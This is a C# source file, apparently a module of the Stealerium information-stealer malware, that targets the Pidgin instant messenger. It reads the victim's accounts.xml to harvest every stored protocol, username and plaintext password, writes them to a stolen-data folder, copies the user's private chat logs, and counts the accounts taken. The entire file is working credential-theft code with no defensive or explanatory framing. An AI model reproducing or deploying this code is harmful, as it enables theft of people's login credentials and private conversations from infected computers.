using System;
using System.IO;
using System.Text;
using System.Xml;
using Stealerium.Helpers;

namespace Stealerium.Target.Messengers
{
    internal sealed class Pidgin
    {
        private static readonly StringBuilder SbTwo = new StringBuilder();
        private static readonly string PidginPath = Path.Combine(Paths.Appdata, ".purple");

        private static void GetLogs(string sSavePath)
        {
            try
            {
                var logs = Path.Combine(PidginPath, "logs");
                if (!Directory.Exists(logs)) return;
                Filemanager.CopyDirectory(logs, sSavePath + "\\chatlogs");
            }
            catch (Exception ex)
            {
                Logging.Log("Pidgin >> Failed to collect chat logs\n" + ex);
            }
        }

        private static void GetAccounts(string sSavePath)
        {
            var accounts = Path.Combine(PidginPath, "accounts.xml");
            if (!File.Exists(accounts)) return;

            try
            {
                var xml = new XmlDocument();
                xml.Load(new XmlTextReader(accounts));

                if (xml.DocumentElement != null)
                    foreach (XmlNode nl in xml.DocumentElement.ChildNodes)
                    {
                        var protocol = nl.ChildNodes[0].InnerText;
                        var login = nl.ChildNodes[1].InnerText;
                        var password = nl.ChildNodes[2].InnerText;

                        if (!string.IsNullOrEmpty(protocol) && !string.IsNullOrEmpty(login) &&
                            !string.IsNullOrEmpty(password))
                        {
                            SbTwo.AppendLine($"Protocol: {protocol}");
                            SbTwo.AppendLine($"Username: {login}");
                            SbTwo.AppendLine($"Password: {password}\r\n");

                            Counter.Pidgin++;
                        }
                        else
                        {
                            break;
                        }
                    }

                if (SbTwo.Length <= 0) return;
                Directory.CreateDirectory(sSavePath);
                File.AppendAllText(sSavePath + "\\accounts.txt", SbTwo.ToString());
            }
            catch (Exception ex)
            {
                Logging.Log("Pidgin >> Failed to collect accounts\n" + ex);
            }
        }

        public static void Get(string sSavePath)
        {
            GetAccounts(sSavePath);
            GetLogs(sSavePath);
        }
    }
}